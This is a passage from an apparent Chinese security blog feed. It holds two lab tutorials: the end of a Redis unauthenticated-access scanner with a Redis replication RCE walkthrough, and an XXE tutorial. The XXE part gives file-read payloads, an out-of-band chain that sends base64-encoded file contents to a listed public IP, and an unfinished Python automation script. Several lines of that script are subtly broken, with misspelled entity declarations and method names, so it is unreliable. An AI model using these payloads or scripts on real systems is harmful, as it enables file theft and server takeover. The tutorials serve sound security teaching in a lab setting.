= &#x27;&#x27;</span><br><span class=\"line\">    type = &quot;&quot;</span><br><span class=\"line\">    if len(sys.argv) &lt; 2:  # 程序外部获取参数的桥梁</span><br><span class=\"line\">        print(&#x27;-h 帮助信息;\\n&#x27;)</span><br><span class=\"line\">        sys.exit()</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        banner()</span><br><span class=\"line\">        opts, args = getopt.getopt(argv, &#x27;-u:-p:-s:-h&#x27;)</span><br><span class=\"line\">    except getopt.GetoptError:</span><br><span class=\"line\">        print(&#x27;Error an argument!&#x27;)</span><br><span class=\"line\">        sys.exit()</span><br><span class=\"line\">    for opt, arg in opts:</span><br><span class=\"line\">        if opt == &#x27;-u&#x27;:</span><br><span class=\"line\">            url = arg</span><br><span class=\"line\">        elif opt == &#x27;-s&#x27;:</span><br><span class=\"line\">            type = arg</span><br><span class=\"line\">        elif opt == &#x27;-p&#x27;:</span><br><span class=\"line\">            port = arg</span><br><span class=\"line\">        elif opt == &#x27;-h&#x27;:</span><br><span class=\"line\">            print(usage())</span><br><span class=\"line\">    launcher(url, type, port)</span><br><span class=\"line\">    </span><br><span class=\"line\">def launcher(url, type, port):</span><br><span class=\"line\">    if type == &#x27;Redis&#x27;:</span><br><span class=\"line\">        output = redis_unathored(url_exec(url), port)</span><br><span class=\"line\">        output_exec(output, type)</span><br></pre></td></tr></table></figure></p>\n<p>接下来就是 redis 未授权访问检测脚本的核心部分，根据命令行输入端写入的 IP 或 IP 范围，通过 for 语句循环输出<br />\n。此处通过 socket () 函数尝试连接远程主机的 IP 及端口号，发送 payload 字符串。利用 rcvdata () 函数接收目标主机返回的数据，当时返回的数据含有 'redis<br />\nversion' 字符串时，表明存在未授权访问漏洞，否则不存在</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def redis_unathored(url, port):</span><br><span class=\"line\">    result = []</span><br><span class=\"line\">    s = socket.socket()  # 创建socket</span><br><span class=\"line\">    payload = &quot;\\x2a\\x31\\x0d\\x0a\\x24\\x34\\x0d\\x0a\\x69\\x6e\\x66\\x6f\\x0d\\x0a&quot;</span><br><span class=\"line\">    socket.setdefaulttimeout(10)  # 限制时间</span><br><span class=\"line\"></span><br><span class=\"line\">    for ip in url:</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            s.connect((ip, int(port)))  # 进行发送</span><br><span class=\"line\">            s.sendall(payload.encode())  # 判断每次发送的内容量，删除重合</span><br><span class=\"line\">            resves = s.recv(1024).decode()  # 创建存储</span><br><span class=\"line\">            if resves and &#x27;redis_version&#x27; in resves:</span><br><span class=\"line\">                result.append(str(ip) + &quot;:&quot; + str(port) + &#x27;:&#x27; + &#x27;\\033[1;32;40msuccess\\033[0m&#x27;)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            pass</span><br><span class=\"line\">            result.append(str(ip) + &#x27;:&#x27; + str(port) + &#x27;:&#x27; + &#x27;\\033[1;31;40mfailed \\033[0m&#x27;)</span><br><span class=\"line\">        s.close()</span><br><span class=\"line\">    return (result)</span><br></pre></td></tr></table></figure></p>\n<p>接下来针对 IP 区段内的网络主机进行未授权访问检测，在进行内网渗透测试的过程中，由于输入单个 IP 地址进行测试较为复杂，因此有必要进行 IP 段段内检测。该部分代码主要以特殊字符 &quot;-&quot; 为目标字符进行分隔，将分隔后的字符进行 for 循环存入列表中，以便被函数 redis_unauthored () 调用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def url_list(li):</span><br><span class=\"line\">    ss = []</span><br><span class=\"line\">    i = 0</span><br><span class=\"line\">    j = 0</span><br><span class=\"line\">    zi = []</span><br><span class=\"line\">    for s in li:</span><br><span class=\"line\">        a = s.find(&#x27;-&#x27;)</span><br><span class=\"line\">        i = i + 1</span><br><span class=\"line\">        if a != -1:</span><br><span class=\"line\">            ss = s.rsplit(&quot;-&quot;)</span><br><span class=\"line\">            j = i</span><br><span class=\"line\">            break</span><br><span class=\"line\">    for s in range(int(ss[0]), int(ss[1]) + 1):</span><br><span class=\"line\">        li[j - 1] = str(s)</span><br><span class=\"line\">        aa = &#x27;.&#x27;.join(li)</span><br><span class=\"line\">        zi.append(aa)</span><br><span class=\"line\">    return zi</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def url_exec(url):</span><br><span class=\"line\">    i = 0</span><br><span class=\"line\">    zi = []</span><br><span class=\"line\">    group = []</span><br><span class=\"line\">    group1 = []</span><br><span class=\"line\">    group2 = []</span><br><span class=\"line\">    li = url.split(&#x27;.&#x27;)</span><br><span class=\"line\">    if (url.find(&#x27;-&#x27;) == -1):</span><br><span class=\"line\">        group.append(url)</span><br><span class=\"line\">        zi = group</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        for s in li:</span><br><span class=\"line\">            a = s.find(&#x27;-&#x27;)</span><br><span class=\"line\">            if a != -1:</span><br><span class=\"line\">                i = i + 1</span><br><span class=\"line\">        zi = url_list(li)</span><br><span class=\"line\">        if i &gt; 1:</span><br><span class=\"line\">            for li in zi:</span><br><span class=\"line\">                zz = url_list(li.split(&#x27;.&#x27;))</span><br><span class=\"line\">                for ki in zz:</span><br><span class=\"line\">                    group.append(ki)</span><br><span class=\"line\">                zi = group</span><br><span class=\"line\">                i = i - 1</span><br><span class=\"line\">        if i &gt; 1:</span><br><span class=\"line\">            for li in zi:</span><br><span class=\"line\">                zzz = url_list(li.split(&#x27;.&#x27;))</span><br><span class=\"line\">                for ki in zzz:</span><br><span class=\"line\">                    group1.append(ki)</span><br><span class=\"line\">            zi = group1</span><br><span class=\"line\">            i = i - 1</span><br><span class=\"line\">        if i &gt; 1:</span><br><span class=\"line\">            for li in zi:</span><br><span class=\"line\">                key = url_list(li.split(&#x27;.&#x27;))</span><br><span class=\"line\">                for ki in key:</span><br><span class=\"line\">                    group2.append(ki)</span><br><span class=\"line\">            zi = group2</span><br><span class=\"line\">    return zi</span><br></pre></td></tr></table></figure></p>\n<p>设置数据的输出格式，使输出的数据更加美观、简洁，增加可读性。该部分代码的输出字段主要分三段信息，其中包括 IP 地址、端口号、状态信息</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def output_exec(output, type):</span><br><span class=\"line\">    print(&quot;\\033[1;32;40m&quot; + type + &quot;......\\033[0m&quot;)</span><br><span class=\"line\">    print(&quot;++++++++++++++++++++++++++++++++++++++++++++++++&quot;)</span><br><span class=\"line\">    print(&quot;|         ip         |    port   |     status  |&quot;)</span><br><span class=\"line\">    for li in output:</span><br><span class=\"line\">        print(&quot;+-----------------+-----------+--------------+&quot;)</span><br><span class=\"line\">        print(&quot;|   &quot; + li.replace(&quot;:&quot;, &quot;   |    &quot;) + &quot;  | &quot;)  # 替换字符串</span><br><span class=\"line\">    print(&quot;+----------------+------------+---------------+\\n&quot;)</span><br><span class=\"line\">    print(&quot;[*] shutting down....&quot;)</span><br></pre></td></tr></table></figure></p>\n<p>该脚本的原理比较简单，我们用 redis-cli 连接过的知道，如果存在未授权漏洞那么 info 命令能输出诸多信息，这里就利用了这个方法，发送 info 的 payload，用函数接收回显信息，判断信息中带有的特殊字段，来判断是否存在漏洞<br />\n<strong>利用主从复制进行 RCE</strong></p>\n<p>上面介绍了拥有 root 权限的 redis 怎么拿 shell，但是也有很多时候 redis 不被赋予 root 权限，这时候就需要用到上面所说的主从复制的知识点来进行 RCE</p>\n<blockquote>\n<p>主从模式指使用一个 redis 作为主机，其他的作为备份机，主机从机数据都是一样的，从机只负责读，主机只负责写。在 Reids<br />\n4.x 之后，通过外部拓展，可以实现在 redis 中实现一个新的 Redis 命令，构造恶意.so 文件。在两个 Redis 实例设置主从模式的时候，Redis 的主机实例可以通过 FULLRESYNC 同步文件到从机上。然后在从机上加载恶意 so 文件，即可执行命令。</p>\n</blockquote>\n<p>搭建 vulhub 靶场</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker-compose up -d</span><br></pre></td></tr></table></figure></p>\n<p>开启<br />\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/aiByWcFPqwF5ChJl.png!thumbnail\" alt=\"\" title=\"fig:\" /></p>\n<p>查看 docker 中启动的进程</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker ps -a</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/v5eDdeSSOFNFyOuy.png!thumbnail\" alt=\"\" /></p>\n<p>这里得到刚才启动的 redis 容器的 ID 为 25137f98e35d</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker exec -it 25137f98e35d /bin/bash</span><br></pre></td></tr></table></figure></p>\n<p>进入容器</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /etc/hosts</span><br></pre></td></tr></table></figure></p>\n<p>查看容器 IP<br />\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/XRBrApApv5QKxI2N.png!thumbnail\" alt=\"\" title=\"fig:\" /></p>\n<p>得到容器 IP 为 172.18.0.2，该 IP 就作为目标 ip 也就是靶机来进行攻击，当然也可以以搭建环境的这台虚拟机来作为靶机，因为 6379 端口已经自动映射出去了</p>\n<p>接下来先测试连接 redis</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DTAcyuTMdPkTLcCv.png!thumbnail\" alt=\"\" /></p>\n<p>成功，接着利用脚本进行主从复制 getshell</p>\n<p>工具脚本：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand（需要make）</span><br><span class=\"line\">git clone https://github.com/Ridter/redis-rce.git</span><br><span class=\"line\">https://github.com/vulhub/redis-rogue-getshell</span><br><span class=\"line\">https://github.com/jas502n/Redis-RCE</span><br><span class=\"line\">工具下载总结来自：https://blog.51cto.com/u_12343119/5850923</span><br></pre></td></tr></table></figure></p>\n<p>下载完成后进入目录执行脚本并且使用 exp_lin.so 文件</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./redis-rce.py -r 172.18.0.2 -p 6379 -L 192.168.40.136 -f exp_lin.so</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kQrxYZJ4Sc1R45BM.png!thumbnail\" alt=\"\" /></p>\n<p>成功 getshell</p>\n<p><strong>redis 防御策略</strong></p>\n<p>1. 禁止远程使用高危命令</p>\n<p>2. 低权限运行 redis 服务</p>\n<p>3. 禁止外网访问 redis</p>\n<p>4. 阻止其他用户添加新的公钥，将 authorized_keys 的权限设置为对拥有者只读</p>\n",
            "tags": [
                "其它",
                "其它"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/",
            "url": "https://nnnpc.github.io/2024/04/16/%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/",
            "title": "外部实体注入漏洞",
            "date_published": "2024-04-16T05:58:19.054Z",
            "content_html": "<p>当允许引用外部实体时，会造成外部实体注入（XXE）漏洞。通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害</p>\n<p>根据有无回显的情况，XXE 漏洞可分为如下两种：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">有回显的XXE</span><br><span class=\"line\">无回显的XXE</span><br></pre></td></tr></table></figure></p>\n<p>以 XXE-Lab 靶场来进行演示<br />\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/JVDd4I64OrHmuUSn.png!thumbnail\" alt=\"\" title=\"fig:\" /></p>\n<p><strong>有回显 XXE</strong></p>\n<p>先在自己的 C 盘目录下创建一个 txt 文件，内容随便，这里就以 1.txt 和 hacker！！！来进行演示</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UserName：&amp;b;</span><br><span class=\"line\">Password：admin</span><br></pre></td></tr></table></figure></p>\n<p>抓包 Login 并发送到重发器<br />\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rbo8AxajVDsDApvV.png!thumbnail\" alt=\"\" title=\"fig:\" /></p>\n<p>这里可以看到是以 xml 的形式发送到 doLogin.php 进行解析，那就直接试着在 body 中加入 xml 的内容，看看是否能被解析</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE test[</span><br><span class=\"line\">&lt;!ENTITY b SYSTEM &quot;file:///c:/1.txt&quot;&gt;</span><br><span class=\"line\">]&gt;</span><br></pre></td></tr></table></figure></p>\n<p>构造 payload 对 C 盘下的 1.txt 文件进行读取， <code>&lt;!ENTITY b SYSTEM &quot;file:///c:/1.txt&quot;&gt;</code>  中的 b 为用户名中的参数，&quot;&quot; 之间为读取文件以及文件路径</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file:///                #file协议读取文件</span><br><span class=\"line\">http://url/file.txt     #http协议读取站点下的文件</span><br><span class=\"line\">PHP://filter            #文件流形式读取php文件</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QD1z7SIb6qNXsosT.png!thumbnail\" alt=\"\" /></p>\n<p>成功读取，修改 txt 中的内容为 Hello hacker!!! 再试一遍</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7J9GFIIAnSDLuZsJ.png!thumbnail\" alt=\"\" /></p>\n<p><strong>无回显 XXE</strong></p>\n<p>接下来进行无回显的 XXE 演示。在这之前需要关闭靶场的信息输出，打开靶场目录下的 php_xxe/doLogin.php 文件</p>\n<blockquote>\n<p>1. 注释 echo $result;<br />\n2. 添加 error_reporting (0);</p>\n</blockquote>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4MWYk19N4ue27klM.png!thumbnail\" alt=\"\" /></p>\n<p>同样再次尝试注入，发现不会返回任何信息</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DG0D0T2Xqy2zoHPH.png!thumbnail\" alt=\"\" /></p>\n<p>对于无回显的 XXE，需要构建一条带外数据（Out-of<br />\nBand，OOB）通道来读取数据，思路如下：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.攻击者先发送payload1给Web服务器</span><br><span class=\"line\">2.payload1触发web服务器，web服务器向vps获取恶意DTD，并执行payload2</span><br><span class=\"line\">3.payload2使web服务器把结果作为参数来访问vps上的HTTP服务</span><br><span class=\"line\">4.攻击者通过vps的HTTP访问记录得到结果</span><br></pre></td></tr></table></figure></p>\n<p>攻击过程图如下：<br />\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6Pzd8oTxfjqAPOBC.png!thumbnail\" alt=\"\" title=\"fig:\" /></p>\n<p>首先在 vps 上创建名为 evil.xml 的恶意 DTD 文件，并将其放在 apache 的网页目录下，同时开启 apache 服务</p>\n<p>payload1：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE test[</span><br><span class=\"line\">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=c:/1.txt&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % remote SYSTEM &quot;http://117.50.184.154/evil.xml&quot;&gt;</span><br><span class=\"line\">%remote;</span><br><span class=\"line\">%int;</span><br><span class=\"line\">%send;</span><br><span class=\"line\">]&gt;</span><br></pre></td></tr></table></figure></p>\n<p>payload2：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://43.138.160.92/?content=%file;&#x27;&gt;&quot;&gt; %payload;</span><br></pre></td></tr></table></figure></p>\n<p>根据 payload1 和 payload2，evil.xml 是攻击者存放于 vps 上 apache 的 web 目录下的文件，流程理解为：先发送 payload1 给 web 服务器，其中包括文件的读取操作和引用恶意 DTD 的操作，payload1 作为 xml 文件会被发送至 doLogin 进行解析，但是读取后并没有回显，这时候 remote 引用了恶意的 DTD 文件，进行解析，执行了 payload2，执行 send 指令将回显作为参数发送到 vps 上，并且对 vps 的 http 服务进行了访问，这时候攻击者通过 vps 的 http 的访问记录便可以读取到回显。相当于将回显作为参数进行了一次转发，通过另外的渠道进行了读取<br />\n接下来开始复现</p>\n<p>ubuntu 的机子直接用命令安装 apache 服务</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install apache2</span><br></pre></td></tr></table></figure></p>\n<p>访问下公网 ip 确定 apache 服务已经搭建完毕<br />\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/qcqAu9O76NRWYIjh.png!thumbnail\" alt=\"\" title=\"fig:\" /></p>\n<p>接着在 /var/www/html 中写入 evil.xml 文件，内容为 payload2，写入成功后 ip/evil.xml 访问文件确认是否能被 payload1 引用到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/fJqsGAnuGuvLcOjq.png!thumbnail\" alt=\"\" /></p>\n<p>成功，接下来就是利用环节了</p>\n<p>在 vps 上命令开启访问日志的监控</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tail -f /var/log/apache2/access.log</span><br></pre></td></tr></table></figure></p>\n<p>接着抓包登录界面，使用 payload1 并发送到重发器当中进行发送<br />\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DgZpEBzDiFUlWeYq.png!thumbnail\" alt=\"\" title=\"fig:\" /></p>\n<p>回显 200，发送成功，回 vps 上查看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/S0Mks2Mk8aY3DIin.png!thumbnail\" alt=\"\" /></p>\n<p>成功实现转发，由于之前对读取操作的回显进行了 base64 编码，因此该串 base64 编码便是读取文件的内容，进行解码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MMGOeCXa0scx5q9e.png!thumbnail\" alt=\"\" /></p>\n<p>成功读取</p>\n<p><strong>检测方法</strong></p>\n<blockquote>\n<p>在目标服务器无回显情况下，只能通过 OOB 信息传送来进行 XXE 攻击，但实际的操作过程则比较繁琐，针对无回显的 XXE，通过 python 脚本来实现流程自动化<br />\n写入脚本相关信息和模块</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from http.server import HTTPServer,SimpleHTTPRequestHandler</span><br><span class=\"line\">import threading</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import sys</span><br></pre></td></tr></table></figure></p>\n<p>编写攻击 payload 的生成函数，能够根据给定的 IP 地址和端口生成相应的包含恶意 DTD 的 XML 文件：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def ExportPayload(lip,lport):</span><br><span class=\"line\">    file = open(&#x27;evil.xml&#x27;,&#x27;w&#x27;)</span><br><span class=\"line\">    file.write(&quot;&lt;!ENTITY % payload \\&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://&#123;0&#125;：&#123;1&#125;/?content=%file;&#x27;&gt;\\&quot;&gt; %payload;&quot;.format(lip,lport))</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\">    print(&quot;[*] payload文件创建成功！&quot;)</span><br></pre></td></tr></table></figure></p>\n<p>编写 HTTP 服务函数，通过 http.server 模块实现 HTTP 服务，用来监听目标服务器返回的数据：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 开启HTTP服务，接收数据</span><br><span class=\"line\">def StartHTTP(lip, lport):</span><br><span class=\"line\">    # HTTP监听的IP地址和端口</span><br><span class=\"line\">    serverAddr = (lip, lport)</span><br><span class=\"line\">    httpd = HTTPServer(serverAddr, MyHandler)</span><br><span class=\"line\">    print(&quot;[*]正在开启HTTP服务器：\\n\\n================\\nIP地址:&#123;0&#125;\\n端口：&#123;1&#125;\\n==================\\n&quot;.format(lip, lport))</span><br><span class=\"line\">    httpd.server_forever()</span><br></pre></td></tr></table></figure></p>\n<p>编写 POST 发送函数，用来向目标服务器发送攻击数据：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 通过POST发送攻击数据</span><br><span class=\"line\">def SendData(lip, lport, url):</span><br><span class=\"line\">    # 需要读取的文件路径（默认值）</span><br><span class=\"line\">    filePath = &quot;c:\\\\1.txt&quot;</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        # 对用户输入的文件路径斜杠替换</span><br><span class=\"line\">        filePath = filePath.replace(&#x27;\\\\&#x27;, &quot;/&quot;)</span><br><span class=\"line\">        data = &quot;&lt;?xml version=\\&quot;1.0\\&quot;?&gt;\\n&lt;?DOCTYPE test[\\n&lt;!ENtity  % file SYSTEM &quot; \\</span><br><span class=\"line\">               &quot;\\&quot;php://filter/read=convert.base64-encode/resource=&#123;0&#125;\\&quot;&gt;\\n&lt;!ENTUTY % remote SYSTEM \\&quot;http://&#123;1&#125;:&#123;&quot; \\</span><br><span class=\"line\">               &quot;2&#125;/evil.xml\\&quot;&gt;\\n%remote;\\n%int;\\n%send;\\n]&gt;&quot;.format( </span><br><span class=\"line\">            filePath, lip, lport)</span><br><span class=\"line\">        requests.post(url, data=data)</span><br><span class=\"line\">        # 继续接收用户的输入，读取指定文件</span><br><span class=\"line\">        filePath = input(&quot;Input filePath:&quot;)</span><br></pre></td></tr></table></figure></p>\n<p>定义一个消息处理类，这个类继承自 SimpleHTTPRequestHandler。同时需要对原生的日志消息函数进行重写，使其在输出访问信息的同时，把访问的信息记录到文件中去（该函数位于 BaseHTTPServer.py 中）：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 对原生的log_message函数进行重写，在输出结果的同时把结果保存到文件中</span><br><span class=\"line\">class MyHandler(SimpleHTTPRequestHandler):</span><br><span class=\"line\">    def log_message(self, format, *args):</span><br><span class=\"line\">        # 终端输出HTTP访问信息</span><br><span class=\"line\">        sys.stderr.write(&quot;%s - - [%s] %s\\n&quot; % (self.client_address[0], self.log_data_time_string(), format % args))</span><br><span class=\"line\">        # 保存信息到文件</span><br><span class=\"line\">        textFile = open(&quot;result.txt&quot;, &quot;a&quot;)</span><br><span class=\"line\">        textFile.write(&quot;%s - - [%s] %s\\n&quot; % (</span><br><span class=\"line\">        self.client_address[0], self.client_address[0], self.log_data_time_string(), format % args))</span><br><span class=\"line\">        textFile.close()</span><br></pre></td></tr></table></figure></p>\n<p>编写主函数，在其中进行相关变量的定义以及函数的调用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    # 本机IP</span><br><span class=\"line\">    lip = &quot;IP&quot;</span><br><span class=\"line\">    # 本机HTTP监听端口</span><br><span class=\"line\">    lport = port</span><br><span class=\"line\">    # 目标网站提交表单的URL</span><br><span class=\"line\">    url = 